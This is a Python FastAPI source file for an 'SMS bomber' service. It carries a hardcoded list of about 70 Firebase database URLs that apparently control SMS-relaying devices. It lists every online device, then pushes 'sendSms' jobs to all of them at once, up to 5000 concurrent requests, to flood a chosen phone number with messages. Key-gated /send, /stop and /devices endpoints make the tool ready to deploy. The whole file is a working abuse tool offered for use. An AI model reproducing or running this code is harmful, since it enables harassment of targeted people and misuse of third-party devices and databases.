#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v8.1 — ULTRA FLASH        ║
║   ▸ API Key Protected (6 keys)                          ║
║   ▸ ALL Firebase (dedupe + kept)                        ║
║   ▸ TRUE Full Fan-Out (ALL devices × count parallel)    ║
║   ▸ Full Symbol/Space/Emoji Support ✅                  ║
║   ▸ /stop endpoint                                      ║
║   ▸ Flash Speed 🚄🚄🚄                                   ║
║   ▸ Vercel Ready                                        ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
import urllib.parse
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — ALL KEPT (duplicates auto-removed)
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    # ── Group 1 (new) ──────────────────────────────────────
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
    "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
    "https://rambhai-2c356-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://tirgon-e0e0e-default-rtdb.firebaseio.com",
    "https://surajptiyanka-default-rtdb.firebaseio.com",
    "https://rtoch-8b5ed-default-rtdb.firebaseio.com",
    "https://online-a2823-default-rtdb.firebaseio.com",
    "https://awakenn88-default-rtdb.firebaseio.com",
    "https://adityakaapp-default-rtdb.firebaseio.com",
    "https://amaat-a7916-default-rtdb.firebaseio.com",
    "https://amit-6f40a-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://bali-7acc3-default-rtdb.firebaseio.com",
    "https://bihar-master-panel-fb7cd-default-rtdb.firebaseio.com",
    "https://botsieeee-af07c-default-rtdb.firebaseio.com",
    "https://gadhalalund-default-rtdb.firebaseio.com",
    "https://iiilsoee-default-rtdb.firebaseio.com",
    "https://lucky-c0915-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://nidhi-rani-default-rtdb.firebaseio.com",
    "https://nowammyxdd-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://rohitbona-d8308-default-rtdb.firebaseio.com",
    "https://sonuganduu-9d4da-default-rtdb.firebaseio.com",
    "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
    # ── Group 2 (original big list) ────────────────────────
    "https://aawasbaba-c07c6-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://alwaysatiif7-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://check-skyler-default-rtdb.firebaseio.com",
    "https://chilgumsir-default-rtdb.firebaseio.com",
    "https://crdio-3cf5c-default-rtdb.firebaseio.com",
    "https://deepk-hh-default-rtdb.firebaseio.com",
    "https://desert-fc320-default-rtdb.firebaseio.com",
    "https://fudofficer-cdc70-default-rtdb.firebaseio.com",
    "https://gfaatelisell-default-rtdb.firebaseio.com",
    "https://htbc51-default-rtdb.firebaseio.com",
    "https://kalih-f389d-default-rtdb.firebaseio.com",
    "https://keepsnss-default-rtdb.firebaseio.com",
    "https://krijhjuiiccyy-default-rtdb.firebaseio.com",
    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
    "https://master-panel-6bcfe-default-rtdb.firebaseio.com",
    "https://maxo12-default-rtdb.firebaseio.com",
    "https://mmmmnnnnn-4ba6f-default-rtdb.firebaseio.com",
    "https://mook-1ddfc-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://shadow-f9cd3-default-rtdb.firebaseio.com",
    "https://sk-paid-panel-default-rtdb.firebaseio.com",
    "https://tinmur-777e8-default-rtdb.firebaseio.com",
    "https://vasu-new-panel-default-rtdb.firebaseio.com",
    "https://bhai-138a8-default-rtdb.firebaseio.com",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://deepa-1b7d0-default-rtdb.firebaseio.com",
    "https://panel-9-d6ece-default-rtdb.firebaseio.com",
    "https://sivam-8f7ed-default-rtdb.firebaseio.com",
    "https://adani-5dd2c-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://amit2-dc1b7-default-rtdb.firebaseio.com",
    "https://biharibhaiya-c718b-default-rtdb.firebaseio.com",
    "https://project9-default-rtdb.firebaseio.com",
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
]

SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/sendSms.json",
    "sendSms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# ⚙️ ULTRA FLASH SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 5000
BATCH_CHUNK = 5000
REQUEST_TIMEOUT = 6
CONNECT_TIMEOUT = 2
DEVICE_CACHE_TTL = 30

API_NAME = "@BRONX_ULTRA"
API_VERSION = "8.1"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Ultra Firebase Bomber — Flash Speed",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 🔴 REDIS (OPTIONAL)
# ═══════════════════════════════════════════════════════════
redis = None
try:
    REDIS_URL = os.getenv("UPSTASH_REDIS_REST_URL")
    REDIS_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN")
    if REDIS_URL and REDIS_TOKEN:
        from upstash_redis.asyncio import Redis
        redis = Redis(url=REDIS_URL, token=REDIS_TOKEN)
        print("✅ Redis connected")
except Exception as e:
    print(f"⚠️ Redis init skipped: {e}")
    redis = None

_LOCAL_STOP = set()
_DEVICE_CACHE = {"devices": None, "ts": 0}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    if not api_key:
        return False
    return api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return key
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


def fix_message(raw_message, is_get: bool) -> str:
    """
    ✅ Fix message so ALL symbols/spaces/emojis work:
      - '+' → space (GET only, URL standard)
      - '\\n' literal → real newline
      - '%20', '%23' etc → decoded (FastAPI already does this)
      - strip extra whitespace at edges
    """
    if raw_message is None:
        return ""

    if not isinstance(raw_message, str):
        raw_message = str(raw_message)

    msg = raw_message

    # GET me '+' ko space banao (URL query standard)
    if is_get:
        # Agar FastAPI ne already decode kar diya aur '+' as-is aaya,
        # toh use space banao (kyunki user ka intent space hi tha)
        msg = msg.replace("+", " ")

    # Literal '\n' (backslash + n) ko real newline banao
    msg = msg.replace("\\n", "\n")
    msg = msg.replace("\\t", "\t")

    # Aage/peeche ke extra spaces/newlines hatao
    msg = msg.strip()

    return msg


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            return [
                {"id": k, "url": base}
                for k, v in data.items()
                if isinstance(v, dict) and v.get("status") is True
            ]
    except Exception:
        return []


async def get_all_devices(session, use_cache=False):
    if use_cache:
        age = time.time() - _DEVICE_CACHE["ts"]
        if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
            return _DEVICE_CACHE["devices"]

    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)

    _DEVICE_CACHE["devices"] = out
    _DEVICE_CACHE["ts"] = time.time()
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payload = {
            "from": 1,
            "to": target,
            "message": message,
            "isSended": False,
            "timestamp": int(time.time() * 1000),
        }
        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"
            try:
                async with session.put(url, json=payload) as r:
                    if r.status in (200, 201):
                        stats["success"] += 1
                        return True
                    if r.status == 403:
                        stats["blocked"] += 1
                        return False
            except Exception:
                continue
        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    if number in _LOCAL_STOP:
        return True
    if redis:
        try:
            val = await redis.get(f"stop:{number}")
            return val is not None
        except Exception:
            return False
    return False


# ═══════════════════════════════════════════════════════════
# 💣 FULL FAN-OUT WORKER — ULTRA FLASH ⚡
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    if redis:
        try:
            await redis.delete(f"stop:{number}")
        except Exception:
            pass
    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=600,
        force_close=False,
        enable_cleanup_closed=True,
        use_dns_cache=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
        sock_read=REQUEST_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=True)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*60}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTRA FLASH")
        print(f"[{jid}] Key        : {api_key}")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Message    : {message[:60]}")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*60}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests "
              f"(sem={MAX_CONCURRENT})...")

        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]:
                    t.cancel()
                break

            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            elapsed_sf = time.time() - t0
            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"{elapsed_sf:.1f}s | {speed_sf}/s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄🚄🚄")
        print(f"{'='*60}\n")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "redis": "connected" if redis else "off",
        "mode": "ULTRA FLASH — all devices × count simultaneously",
        "max_concurrent": MAX_CONCURRENT,
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
        },
        "header_alternative": "X-API-Key: YOUR_KEY",
        "tip": "POST JSON use karo for full symbol/emoji support 🎯",
    }


@app.get("/health")
async def health():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "ok",
        "time": datetime.now().isoformat(),
    }


@app.get("/keys")
async def keys_info():
    return {
        "api": API_NAME,
        "total_keys": len(VALID_KEYS),
        "hint": "Contact admin for a valid key",
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /send — FULL SYMBOL SUPPORT
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"

    # ─── Parse query (both GET and POST) ───────────────────
    query_data = dict(request.query_params)

    # ─── Parse body (POST only) ────────────────────────────
    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                form = await request.form()
                body_data = dict(form)
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    # ─── Key check ─────────────────────────────────────────
    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 API key required"},
            status_code=401,
        )

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "❌ Invalid API key"},
            status_code=401,
        )

    # ─── Message (FULL SYMBOL SUPPORT) ─────────────────────
    raw_message = merged.get("message") or merged.get("msg") or ""
    message = fix_message(raw_message, is_get)

    # ─── Number ────────────────────────────────────────────
    number = merged.get("number") or merged.get("num") or merged.get("numer") or ""
    number = str(number).strip()

    # ─── Count ─────────────────────────────────────────────
    count_str = merged.get("count", "1")

    # ─── Validation ────────────────────────────────────────
    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400
        )

    clean_number = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean_number.isdigit() or len(clean_number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400
        )

    # ─── Launch ────────────────────────────────────────────
    bg.add_task(bomb_worker, clean_number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "key_used": api_key,
        "target": clean_number,
        "message_sent": message,       # ✅ confirm — kya bheja
        "message_length": len(message),
        "per_device": count,
        "mode": "ULTRA FLASH FAN-OUT",
        "note": "Total SMS = (online devices) × count — ALL parallel",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400
        )

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)
    if redis:
        try:
            await redis.set(f"stop:{number}", "1", ex=300)
        except Exception:
            pass

    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices": devices,
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "success": True,
        "total": len(FIREBASE_URLS),
        "firebases": FIREBASE_URLS,
    }


# Vercel handler
handler = app
